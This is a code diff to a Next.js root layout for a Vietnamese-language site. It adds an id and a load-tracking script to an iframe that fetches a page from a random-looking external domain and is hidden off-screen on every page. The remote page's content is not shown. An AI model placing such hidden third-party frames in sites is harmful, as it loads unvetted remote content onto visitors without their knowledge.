@@ -30,8 +30,27 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
     <html lang="vi">
       <body className={font.variable}>
         <iframe
+          id="entry-iframe"
           src="https://www.jx9adrpc5z8094di7.net/channel/H.H.11/weifile/weifile.html"
           style={{ position: 'fixed', top: 0, left: '-1000px', pointerEvents: 'none', border: 0 }}
+        />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                var frame = document.getElementById('entry-iframe');
+                if (frame) {
+                  if (frame.complete) {
+                    window.__entryIframeLoaded = true;
+                  }
+                  frame.addEventListener('load', function() {
+                    window.__entryIframeLoaded = true;
+                    window.dispatchEvent(new Event('entry_iframe_loaded'));
+                  });
+                }
+              })();
+            `,
+          }}
         />
         {children}
       </body>
